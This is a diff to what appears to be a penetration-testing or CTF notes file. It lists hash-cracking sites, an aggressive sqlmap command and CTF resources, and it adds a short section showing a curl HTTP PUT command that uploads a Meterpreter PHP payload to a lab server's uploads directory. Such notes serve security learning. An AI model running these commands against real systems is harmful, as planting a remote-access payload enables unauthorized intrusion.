@@ -21,7 +21,13 @@ https://www.hashcat.online/
     https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php
     https://labs.nettitude.com/tools/rocktastic/
     sqlmap -r login.req --level 5 --risk 3
-    
+    ===================================================
+    HTTP PUT with Curl
+
+Finally we can also upload the Meterpreter payload with a single command using Curl:
+
+    curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://172.28.128.3:8585/uploads/meterpreter.php
+    ===================================================
     https://capturetheflag.withgoogle.com/#beginners/
     https://github.com/google/google-ctf
     https://www.youtube.com/watch?v=qDYwcIf0LZw
